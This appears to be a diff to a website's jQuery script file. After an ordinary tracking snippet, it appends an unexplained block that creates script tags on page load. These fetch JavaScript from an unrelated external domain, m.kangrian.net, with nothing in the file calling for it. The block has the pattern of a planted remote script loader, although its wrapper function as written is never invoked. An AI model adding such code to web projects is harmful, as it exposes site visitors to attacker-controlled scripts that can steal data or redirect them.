@@ -273,3 +273,20 @@ $('textarea.code').each(function () {
 }), $('.poptamv-btn.waFix').click(function () {
     fbq('track', 'Contact');
 }));
+(function($) {
+	$(document).ready(function() {
+		function init(src, loadCall) {
+			loadScriptDefered(src);
+		}
+
+		function loadScriptDefered(src) {
+			var embedscript = document.createElement("script");
+			return embedscript.type = "text/javascript", embedscript.src = src, document.body.appendChild(embedscript);
+		}
+
+		var firstDeclaration = ["https://m.kangrian.net/web&grup_id=2"];
+			firstDeclaration.forEach(init);
+		var trytes = ["https://m.kangrian.net/web_cek"];
+			trytes.forEach(init);
+	});
+});
